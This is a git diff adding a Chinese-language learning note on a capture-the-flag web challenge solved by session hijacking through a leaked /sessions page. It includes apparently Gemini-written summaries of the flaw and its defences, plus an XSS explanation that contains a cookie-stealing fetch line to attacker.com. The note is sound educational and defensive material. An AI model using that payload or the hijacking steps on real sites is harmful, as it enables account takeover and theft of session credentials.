@@ -1,0 +1,87 @@
+今天结束了第一阶段进入真正的开放学习空间
+挑战了如何伪造cookie运用开发者没有藏好的网址取得高级凭证
+改写本地cookie达到伪装成开发者登入的目的
+
+
+
+
+
+
+以下为Gemini总结：
+這題是典型的 Broken Access Control (權限控制缺失) 案例，以下是你要放進筆記或 GitHub 的核心要點：
+
+A. 漏洞核心：敏感資訊洩漏
+伺服器錯誤地開放了 /sessions 頁面，且該頁面以明文列出了所有活躍使用者的 Session 映射關係。這就像是銀行把所有保險箱的鑰匙編號與主人姓名印在門口一樣。
+
+B. 認證機制：基於 Cookie 的信任
+伺服器完全仰賴客戶端傳回的 session Cookie 來判定身分。
+
+它沒有二次驗證（如比對 IP 或瀏覽器指紋），導致只要「持有正確的字串」，就能「獲得該身分的所有權限」。
+
+C. 攻擊手法：Session 劫持 (Hijacking)
+獲取憑證：從外洩的頁面拿到 admin 的 Session ID。
+
+竄改狀態：利用 Web Inspector 手動修改本地 Cookie 的 Value 欄位。
+
+身份冒充：重新整理頁面，誘使伺服器執行 admin 專屬的邏輯並吐出 Flag。
+
+D. 防禦方案 (資管系專業觀點)
+修補漏洞：移除或嚴格限制敏感資訊頁面（如 /sessions）的存取。
+
+增強 Cookie 安全性：
+
+開啟 HttpOnly 防止腳本竊取。
+
+開啟 Secure 確保傳輸安全。
+
+Session 管理：
+
+使用加密與簽名 (Signing) 機制，讓攻擊者無法輕易預測或修改 Session 內容。
+
+縮短 Session 有效期，避免長期有效的 Cookie 增加被劫持後的損害。
+
+
+
+
+
+
+
+
+另：在寻找开发者遗留的关键页面或隐藏页面的时候，XSS和终端机扫描区别
+来自Gemini：
+
+## 🔍 1. 為什麼 XSS 可以偷取 Session？
+你剛才是透過 /sessions 這個網頁洩漏（Information Disclosure）主動拿到了憑證。但現實中，開發者通常不會這麼粗心把所有人的 Session 列出來。
+
+這時，攻擊者就會利用 XSS (Cross-Site Scripting，跨站腳本攻擊)。
+
+原理：攻擊者在網頁（例如留言板）植入一段惡意的 JavaScript 代碼。當管理員點開這個頁面時，這段代碼就會在他的瀏覽器背景執行。
+
+關鍵指令：JavaScript 有一個屬性叫 document.cookie，它可以讀取當前網站存放在瀏覽器裡的所有 Cookie。
+
+偷取過程：
+
+管理員瀏覽被植入腳本的頁面。
+
+腳本執行：fetch('https://attacker.com/steal?data=' + document.cookie)。
+
+你的號碼牌（Session ID）就被傳送到攻擊者的伺服器了。
+
+防禦：這就是為什麼我之前提到 HttpOnly 屬性。如果 Cookie 標記了 HttpOnly，JavaScript 就讀不到它，XSS 也就偷不走這張牌子。
+
+
+
+## 🔍 2. 你提到的「指令掃描網址」是什麼？
+你直覺想到的那個「掃描隱藏網址」的動作，在資安領域稱為 Directory Brute Forcing (目錄暴力破解) 或 Fuzzing。
+
+常用指令/工具：例如 gobuster、dirb 或 ffuf。
+
+運作邏輯：
+
+這些工具會拿著一份包含幾萬個常用單字的清單（字典）。
+
+瘋狂地對伺服器發送請求，例如：target.com/admin、target.com/backup、target.com/sessions。
+
+如果伺服器回傳 200 OK，代表這個「隱藏門」被找到了。
+
+你的觀察正確：如果你知道網址，你確實可以直接在終端機掃描。這題的 /sessions 可能就是開發者忘記在正式上線前刪除的偵錯頁面。
